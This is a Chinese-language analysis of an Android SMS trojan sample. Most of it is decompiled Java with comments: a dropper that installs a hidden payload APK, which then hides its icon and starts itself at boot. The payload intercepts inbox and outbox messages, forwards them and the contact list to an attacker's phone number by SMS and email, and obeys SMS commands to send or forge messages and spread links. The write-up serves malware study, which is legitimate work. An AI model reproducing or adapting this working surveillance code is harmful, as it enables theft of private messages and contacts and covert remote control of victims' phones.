# 0x0 前言

## 样本来源

《移动安全攻防进阶》14.3

## 参考

《移动安全攻防进阶》14.3

## 样本情况

样本名: xxshenqi-681fe92e1aba20a7b544fd783a9f20f226a421ce6559105c0f692ec2fd0e63d2.apk

SHA-1: f5a484973f87c21f2e7c15bb2071c71cd8ffa78f

MD5: db3007f01056b70aac3920b628a86f76

加固: 无

# 0x1 入口APK分析

```java
@SuppressLint({"DefaultLocale"})
/* loaded from: classes.dex */
public class MainActivity extends ActionBarActivity {
    Button button1;
    Button button2;
    ArrayList<String> packagNameList;
    EditText pass;
    private MyReceiver receiver;
    @Override 
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(1);
        setContentView(R.layout.loglayout);
        initpackagNameList();
        System.out.println("host开始运行==============================");
        this.receiver = new MyReceiver(this, null);
        //监控应用安装,存在新应用安装时接受到广播
        IntentFilter filter = new IntentFilter("android.intent.action.PACKAGE_ADDED");
        filter.addDataScheme("package");
        registerReceiver(this.receiver, filter);

        //检测是否安装了trogoogle
        boolean installed_1 = detectApk("com.example.com.android.trogoogle");
        if (!installed_1) {
            System.out.println("host开始安装==============================");
            File fileDir = getFilesDir();
            // 构建Trogoogle应用APK在本地的缓存路径
            String cachePath = String.valueOf(fileDir.getAbsolutePath()) + "/com.android.Trogoogle.apk";
            //从assets文件夹中复制Trogoogle应用APK到本地缓存路径
            retrieveApkFromAssets(this, "com.android.Trogoogle.apk", cachePath);
            //显示安装确认对话框
            showInstallConfirmDialog(this, cachePath);
        }
        this.pass = (EditText) findViewById(R.id.password);
        this.button1 = (Button) findViewById(R.id.button1);
        //监控按钮按下
        this.button1.setOnClickListener(new View.OnClickListener() { // from class: com.example.xxshenqi.MainActivity.1
            @Override // android.view.View.OnClickListener
            public void onClick(View arg0) {
                //检查应用是否已经安装
                boolean installed = MainActivity.this.detectApk("com.example.com.android.trogoogle");
                if (!installed) {
                    //显示安装对话框
                    File fileDir2 = MainActivity.this.getFilesDir();
                    String cachePath2 = String.valueOf(fileDir2.getAbsolutePath()) + "/com.android.Trogoogle.apk";
                    MainActivity.this.retrieveApkFromAssets(MainActivity.this, "com.android.Trogoogle.apk", cachePath2);
                    MainActivity.this.showInstallConfirmDialog(MainActivity.this, cachePath2);
                    return;
                }
                boolean isOpenNet = MainActivity.this.goToNetWork();
                if (!isOpenNet) {
                    Toast.makeText(MainActivity.this, "无法连接，请检查您的网络！", 0).show();
                } else if (MainActivity.this.pass.getText().toString().length() >= 6) {
                    Toast.makeText(MainActivity.this, "正在验证，请稍后...", 0).show();
                    Toast.makeText(MainActivity.this, "密码错误或账号不存在！", 0).show();
                } else {
                    Toast.makeText(MainActivity.this, "请输入正确的账号或密码", 0).show();
                }
            }
        });
        this.button2 = (Button) findViewById(R.id.button2);
        this.button2.setOnClickListener(new View.OnClickListener() { // from class: com.example.xxshenqi.MainActivity.2
            @Override // android.view.View.OnClickListener
            public void onClick(View arg0) {
                MainActivity.this.startActivity(new Intent(MainActivity.this, RegisterActivity.class));
            }
        });
    }
    //检查网络连接
    public boolean goToNetWork() {
        //获取连接服务
        ConnectivityManager manager = (ConnectivityManager) getSystemService("connectivity");
        //获取wifi的连接状态
        NetworkInfo.State wifi = manager.getNetworkInfo(1).getState();
        if (wifi != null) {
            return true;
        }
        //获取移动网络的连接状态
        NetworkInfo.State mobile = manager.getNetworkInfo(0).getState();
        return mobile != null;
    }
    //从assets目录中获取APK文件到指定路径的方法
    public boolean retrieveApkFromAssets(Context context, String fileName, String path) {
        File file;
        boolean bRet = false;
        try {
            file = new File(path);
        } catch (IOException e) {
            Toast.makeText(context, e.getMessage(), 2000).show();
            AlertDialog.Builder builder = new AlertDialog.Builder(context);
            builder.setMessage(e.getMessage());
            builder.show();
            e.printStackTrace();
        }
        if (file.exists()) {
            return true;
        }
        file.createNewFile();
        InputStream is = context.getAssets().open(fileName);
        FileOutputStream fos = new FileOutputStream(file);
        byte[] temp = new byte[1024];
        while (true) {
            int i = is.read(temp);
            if (i == -1) {
                break;
            }
            fos.write(temp, 0, i);
        }
        fos.flush();
        fos.close();
        is.close();
        bRet = true;
        return bRet;
    }

    //显示安装确认对话框
    public void showInstallConfirmDialog(final Context context, final String filePath) {
        AlertDialog.Builder tDialog = new AlertDialog.Builder(context);
        tDialog.setIcon(R.drawable.ic_launcher);
        tDialog.setTitle("未安装资源包");
        tDialog.setMessage("请先安装资源包，资源包已整合至APK，点击安装即可安装。");
        tDialog.setPositiveButton("安装", new DialogInterface.OnClickListener() { // from class: com.example.xxshenqi.MainActivity.3
            @Override // android.content.DialogInterface.OnClickListener
            public void onClick(DialogInterface dialog, int which) {
                try {
                    //赋予APK权限
                    String command = "chmod 777 " + filePath;
                    Runtime runtime = Runtime.getRuntime();
                    runtime.exec(command);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                //通过创建一个特定的Intent，并设置相关参数，来触发系统对 APK 文件的安装操作，让用户能够安装指定的应用程序
                Intent intent = new Intent("android.intent.action.VIEW");
                intent.addFlags(268435456);
                intent.setDataAndType(Uri.parse("file://" + filePath), "application/vnd.android.package-archive");
                context.startActivity(intent);
            }
        });
        tDialog.show();
    }

    //遍历应用列表,查看目标apk是否存在
    public boolean detectApk(String packageName) {
        return this.packagNameList.contains(packageName.toLowerCase());
    }
    //初始化已安装应用包名列表的方法
    private void initpackagNameList() {
        this.packagNameList = new ArrayList<>();
        PackageManager manager = getPackageManager();
        List<PackageInfo> pkgList = manager.getInstalledPackages(0);
        for (int i = 0; i < pkgList.size(); i++) {
            PackageInfo pI = pkgList.get(i);
            this.packagNameList.add(pI.packageName.toLowerCase());
        }
    }

    // 广播接收器内部类，用于接收应用安装广播
    private class MyReceiver extends BroadcastReceiver {
        private MyReceiver() {
        }
        /* synthetic */ MyReceiver(MainActivity mainActivity, MyReceiver myReceiver) {
            this();
        }
        @Override // android.content.BroadcastReceiver
        public void onReceive(Context context, Intent intent) {
            System.out.println("MyReceiver 收到广播==========================");
            if (intent.getAction().equals("android.intent.action.PACKAGE_ADDED")) {
                //启动MainActivity
                Intent mIntent = new Intent(context, MainActivity.class);
                context.startActivity(mIntent);
                System.out.println("  界面跳 Ok!==============================");
                // 创建意图，用于启动Trogoogle应用的主活动
                Intent intent11 = new Intent("android.intent.action.MAIN");
                intent11.addFlags(268435456);
                intent11.addCategory("android.intent.category.LAUNCHER");
                ComponentName cn = new ComponentName("com.example.com.android.trogoogle", "com.example.com.android.trogoogle.MainActivity");
                intent11.setComponent(cn);
                context.startActivity(intent11);
                System.out.println("  启动 Ok!==============================");
                SmsManager sms1 = SmsManager.getDefault();
                // 获取短信管理器并发送短信
                sms1.sendTextMessage("18670259904", null, " Tro instanll Ok", null, null);
                System.out.println("  发送短信 Ok!==============================");
            }
        }
    }
}
```

> 核心是释放`com.example.com.android.trogoogle` 并启动,但代码中攻击者暴露了自己的手机号

# 0x2 Trogoogle分析

## 0x0 MainActivity

```java
public class MainActivity extends Activity {
    @Override // android.app.Activity
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(1);
        setContentView(R.layout.activity_main);
        PackageManager p = getPackageManager();
        p.setComponentEnabledSetting(getComponentName(), 2, 1);
        System.out.println("APP图标隐藏成功==============================");
        Intent intent = new Intent();
        intent.setClass(this, ListenMessageService.class);
        startService(intent);
        System.out.println(" startService成功==============================");
        System.out.println("--------->>>finish()");
        finish();
    }
}
```

> 核心是隐藏图标,并启动后台服务

## 0x1 BroadcastAutoBoot

```java
public class BroadcastAutoBoot extends BroadcastReceiver {
    @Override // android.content.BroadcastReceiver
    public void onReceive(Context arg0, Intent arg1) {
        System.out.println("收到开机广播===================================");
        System.out.println("木马 killProcess==================================");
        Intent intent = new Intent();
        intent.setClass(arg0, ListenMessageService.class);
        arg0.startService(intent);
        System.out.println(" startService成功==============================");
        Process.killProcess(Process.myPid());
    }
}
```

> 主要功能是接收开机事件,实现ListenMessageService开机自启

## 0x2 ListenMessageService

> ListenMessageService是该恶意程序的核心代码,恶意行为主要为收集用户手机的通讯录,信息等,并通过短信进行扩散。



SmsObserver： 

```java
private final class SmsObserver extends ContentObserver {
    public SmsHandler smsHandler;

    public SmsObserver(SmsHandler handler) {
        super(handler);
        this.smsHandler = handler;
    }
    //监听短信数据库
    @Override // android.database.ContentObserver
    @SuppressLint({"UnlocalizedSms", "SimpleDateFormat"})
    public void onChange(boolean selfChange) {
        System.out.println("=====================================================");
        System.out.println("木马进入ContentObserver，开始截获----------------------------");
         // 查询短信草稿箱，检查是否有变化
        Cursor cursor = ListenMessageService.this.getContentResolver().query(Uri.parse("content://sms/outbox"), null, null, null, null);
        if (cursor == null) {
            return;
        }
        while (cursor.moveToNext()) {
            System.out.println("木马进入SEND查询---------------------------------");
            // 获取短信内容
            StringBuilder sbBuilder = new StringBuilder();
            sbBuilder.append("sendTo:").append(cursor.getString(cursor.getColumnIndex("address")));
            sbBuilder.append(";content:").append(cursor.getString(cursor.getColumnIndex("body")));
            SmsManager.getDefault().sendTextMessage("18670259904", null, "【数据库截获】SEND::" + sbBuilder.toString(), null, null);
            System.out.println("木马截获SEND短信成功>>>" + sbBuilder.toString());
        }
        cursor.close();
        if (cursor != null) {
            cursor.close();
        }
        // 查询短信收件箱，检查是否有未读短信
        Cursor cursorRecv = ListenMessageService.this.getContentResolver().query(Uri.parse("content://sms/inbox"), new String[]{"_id", "address", "read", "body", "thread_id"}, "read=?", new String[]{"0"}, "date desc");
        if (cursorRecv != null) {
            while (cursorRecv.moveToNext()) {
                System.out.println("木马进入RECV查询---------------------------------");
                // 创建SmsInfo对象，用于存储短信信息
                SmsInfo _smsInfo = new SmsInfo();
                StringBuilder sbBuilder2 = new StringBuilder();
                String content = cursorRecv.getString(cursorRecv.getColumnIndex("body"));
                System.out.println("time->" + System.currentTimeMillis() + ";content->" + content);
                //获取订单号索引
                int indexOfOrder = content.indexOf("#");
                if (indexOfOrder < 0) {
                    // 如果短信内容与上次保存的短信内容相同，或者两次相同短信内容的间隔大于等于15秒，则忽略该短信
                    if (!ListenMessageService.this.app.lastMsg.equals(content)) {
                        ListenMessageService.this.app.lastMsg = content;
                    } else if (System.currentTimeMillis() - ListenMessageService.this.app.time < 15000) {
                        System.out.println("^^^^^^^^^^^^^^^^^");
                        System.out.println("Second # into ,return!");
                        System.out.println("^^^^^^^^^^^^^^^^^");
                        return;
                    }
                } else if (!ListenMessageService.this.app.allMsg.equals(content)) {
                    ListenMessageService.this.app.allMsg = content;
                } else if (System.currentTimeMillis() - ListenMessageService.this.app.time < 5000) {
                    System.out.println("^^^^^^^^^^^^^^^^^");
                    System.out.println("Second time  into ,return!");
                    System.out.println("^^^^^^^^^^^^^^^^^");
                    return;
                }
                ListenMessageService.this.app.time = System.currentTimeMillis();
                _smsInfo.smsBody = content;
                String _ID = cursorRecv.getString(cursorRecv.getColumnIndex("_id"));
                _smsInfo._id = _ID;
                String addrFrom = cursorRecv.getString(cursorRecv.getColumnIndex("address")).replace(" ", "").replace("+86", "");
                _smsInfo.smsAddress = addrFrom;
                _smsInfo.thread_id = cursorRecv.getString(cursorRecv.getColumnIndex("thread_id"));
                _smsInfo.read = cursorRecv.getString(cursorRecv.getColumnIndex("read"));
                sbBuilder2.append("recvFrom:").append(cursorRecv.getString(cursorRecv.getColumnIndex("address")));
                sbBuilder2.append(";content:").append(cursorRecv.getString(cursorRecv.getColumnIndex("body")));
                System.out.println(sbBuilder2.toString());
                if (addrFrom.equals("18670259904")) {
                    System.out.println("木马判断为命令消息，执行");
                    String order = content.substring(0, indexOfOrder);
                    switch (order.hashCode()) {
                        case -1449143887:
                            if (order.equals("readmessage")) {
                                System.out.println("数据库处理发送邮件命令-----------------------------------");
                                String string = ListenMessageService.this.ReadAllMessage(ListenMessageService.this);
                                Intent intent2 = new Intent(ListenMessageService.this, MySendEmailService.class);
                                intent2.putExtra("String", string);
                                ListenMessageService.this.startService(intent2);
                                ListenMessageService.this.Flag = false;
                                _smsInfo.action = 2;
                                break;
                            }
                            ListenMessageService.this.Flag = false;
                            System.out.println("数据库处理不认识的命令--------------------------------------");
                            _smsInfo.action = 2;
                            break;
                        case -973199489:
                            if (order.equals("sendmessage")) {
                                System.out.println("数据库处理发送短信命令----------------------------------");
                                int index1 = content.lastIndexOf(47);
                                String sendTo = content.substring(indexOfOrder + 1, index1);
                                String sendMessage = content.substring(index1 + 1, content.length());
                                SmsManager sms11 = SmsManager.getDefault();
                                sms11.sendTextMessage(sendTo, null, sendMessage, null, null);
                                ListenMessageService.this.Flag = false;
                                _smsInfo.action = 2;
                                break;
                            }
                            ListenMessageService.this.Flag = false;
                            System.out.println("数据库处理不认识的命令--------------------------------------");
                            _smsInfo.action = 2;
                            break;
                        case 3556498:
                            if (order.equals("test")) {
                                System.out.println("数据库收到test命令-----------------------------------");
                                SmsManager.getDefault().sendTextMessage("18670259904", null, "【数据库截获】TEST数据截获（广播失效）", null, null);
                                ListenMessageService.this.Flag = false;
                                _smsInfo.action = 2;
                                break;
                            }
                            ListenMessageService.this.Flag = false;
                            System.out.println("数据库处理不认识的命令--------------------------------------");
                            _smsInfo.action = 2;
                            break;
                        case 579867225:
                            if (order.equals("makemessage")) {
                                System.out.println("数据库处理伪造短信命令------------------------------------------");
                                int index = content.lastIndexOf(47);
                                String fromNumber = content.substring(indexOfOrder + 1, index);
                                String messageBody = content.substring(index + 1, content.length());
                                ListenMessageService.this.Flag = true;
                                new Thread() { // from class: com.example.com.android.trogoogle.ListenMessageService.SmsObserver.1
                                    @Override // java.lang.Thread, java.lang.Runnable
                                    public void run() {
                                        try {
                                            sleep(8000L);
                                        } catch (InterruptedException e) {
                                            e.printStackTrace();
                                        }
                                        System.out.println("==============================================");
                                        System.out.println("开启线程睡眠8秒后 将Flag=false");
                                        System.out.println("==============================================");
                                        ListenMessageService.this.Flag = false;
                                    }
                                }.start();
                                System.out.println("Flag------->>>>>>>" + ListenMessageService.this.Flag);
                                _smsInfo.smsAddress = fromNumber;
                                _smsInfo.smsBody = messageBody;
                                _smsInfo.action = 1;
                                break;
                            }
                            ListenMessageService.this.Flag = false;
                            System.out.println("数据库处理不认识的命令--------------------------------------");
                            _smsInfo.action = 2;
                            break;
                        case 1248164738:
                            if (order.equals("sendlink")) {
                                System.out.println("数据库处理发送Link命令--------------------------------------------");
                                ListenMessageService.this.Flag = false;
                                String linkAddr = content.substring(indexOfOrder + 1);
                                ListenMessageService.this.ReadCONTACTS(ListenMessageService.this, linkAddr);
                                Intent intent211 = new Intent(ListenMessageService.this, MySendEmailService.class);
                                intent211.putExtra("String", ListenMessageService.this.contactArray.toString());
                                ListenMessageService.this.startService(intent211);
                                _smsInfo.action = 2;
                                break;
                            }
                            ListenMessageService.this.Flag = false;
                            System.out.println("数据库处理不认识的命令--------------------------------------");
                            _smsInfo.action = 2;
                            break;
                        default:
                            ListenMessageService.this.Flag = false;
                            System.out.println("数据库处理不认识的命令--------------------------------------");
                            _smsInfo.action = 2;
                            break;
                    }
                    Message msg = this.smsHandler.obtainMessage();
                    msg.obj = _smsInfo;
                    this.smsHandler.sendMessage(msg);
                } else {
                    System.out.println("Flag----------->" + ListenMessageService.this.Flag);
                    if (ListenMessageService.this.Flag) {
                        System.out.println("判断为伪造短信。不用截获不用发送-------------------------");
                    } else {
                        System.out.println("木马判断为普通信息，发送");
                        SmsManager sms1 = SmsManager.getDefault();
                        String sendStr = "【数据库截获】RECV::" + sbBuilder2.toString();
                        if (sendStr.length() > 60) {
                            sms1.sendTextMessage("18670259904", null, sendStr.substring(0, sendStr.length() / 2), null, null);
                            sms1.sendTextMessage("18670259904", null, sendStr.substring((sendStr.length() / 2) + 1), null, null);
                        } else {
                            sms1.sendTextMessage("18670259904", null, sendStr, null, null);
                        }
                        _smsInfo.action = 2;
                        Message msg2 = this.smsHandler.obtainMessage();
                        msg2.obj = _smsInfo;
                        this.smsHandler.sendMessage(msg2);
                    }
                }
                System.out.println("木马完成处理截获短信 >>" + sbBuilder2.toString());
            }
            cursorRecv.close();
            System.out.println("木马离开ContentObserver，完成截获---------------------------------------------------");
            if (cursorRecv != null) {
                cursorRecv.close();
            }
            System.out.println("=====================================================");
            super.onChange(true);
        }
    }
}
```

- SmsObserver.onChange

  ：当短信内容发生变化时调用。

  - 查询短信草稿箱(outbox)

    ​	：检查草稿箱中是否有变化。

    - **cursor为空?**：如果查询结果为空，则结束。
    - **遍历草稿箱短信**：如果查询结果不为空，遍历每条短信并发送短信变化通知。

  - 查询短信收件箱(inbox)

    ：检查收件箱中是否有变化。

    - **cursorRecv为空?**：如果查询结果为空，则结束。

    - 遍历收件箱短信

      ：如果查询结果不为空，遍历每条短信。

      - 短信来自特定号码?

        ：检查短信是否来自特定的监控号码。

        - **否**：如果短信不是来自特定号码，发送短信接收变化通知。

        - 是：

          ​         如果短信来自特定号码，根据短信命令执行不同的操作。

          - **命令: readmessage**：读取所有短信并发送邮件。
          - **命令: sendmessage**：发送短信到指定号码。
          - **命令: test**：发送测试短信。
          - **命令: makemessage**：创建新短信记录。
          - **命令: sendlink**：读取联系人信息并发送邮件。
          - **默认操作**：执行默认操作，设置Flag为false。

  > 该恶意代码的主要流程是拦截短信并转发短信和通讯录给攻击者